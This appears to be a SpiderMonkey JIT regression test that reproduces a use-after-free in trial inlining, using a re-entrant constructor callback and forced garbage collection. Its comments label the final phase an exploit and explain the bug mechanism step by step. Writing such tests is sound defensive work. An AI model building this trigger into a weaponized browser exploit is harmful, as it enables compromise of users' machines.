// |jit-test| --ion-warmup-threshold=100000

var callback = null;

// Constructor that will be trial-inlined.
// Needs polymorphic ICs so ShouldUseMonomorphicInlining returns false
// (ensuring trial inlining is used instead of monomorphic inlining).
function Inner(flag) {
  // polymorphic: different shapes based on flag
  if (flag) {
    this.a = 1; 
  }
  this.val = 2;
  this.extra = 3;
  // Callback to trigger exploit while Inner is on the stack
  if (callback) {
    var cb = callback;
    callback = null;
    cb();
  }
}

// Different constructor to make the IC polymorphic
function Other() {
  this.w = 1;
}

// Outer function containing the call site that will be trial-inlined
function outer(Ctor, flag) {
  return new Ctor(flag);
}

// Phase 1: Make Inner's own ICs polymorphic
// This ensures ShouldUseMonomorphicInlining returns false for Inner
for (var i = 0; i < 30; i++) {
  new Inner(true);
  new Inner(false);
}

// Warm up Other so it has a JIT entry
for (var i = 0; i < 30; i++) {
  new Other();
}

// Phase 2: Warm up the callback path in Inner's baseline code
function dummy() { }
for (var i = 0; i < 20; i++) {
  callback = dummy;
  new Inner(true);
}
callback = null;

// Phase 3: Warm up outer() to trigger trial inlining of Inner
for (var i = 0; i < 900; i++) {
  outer(Inner, true);
}

// Phase 4: Exploit function - called from Inner's callback
function exploit() {
  // Make the call site polymorphic by calling with a different constructor.
  // This triggers:
  //   - A new CacheIR stub is attached for Other
  //   - The IC transitions to Failure state  
  //   - removeInlinedChild is called → ICScript removed from inlinedChildren_
  //     but still owned by InliningRoot's inlinedScripts_ vector
  //   - The old CallInlinedFunction stub remains in the IC chain
  outer(Other, true);

  // This call goes through the old CallInlinedFunction stub.
  // The stub enters CreateThisFromIC → allocation triggers GC → UAF
  gczeal(14, 1);
  outer(Inner, true);
}

// Phase 5: Trigger the exploit
// Call Inner directly (not through outer) so Inner's BaselineJS frame is on the stack.
// This is critical: Inner being on the stack prevents its JitScript from being released
// during GC (maybeReleaseJitScript checks for active frames). Without this, Inner's
// baseline code would be freed, and the freed ICScript would never be dereferenced.
callback = exploit;
new Inner(true);
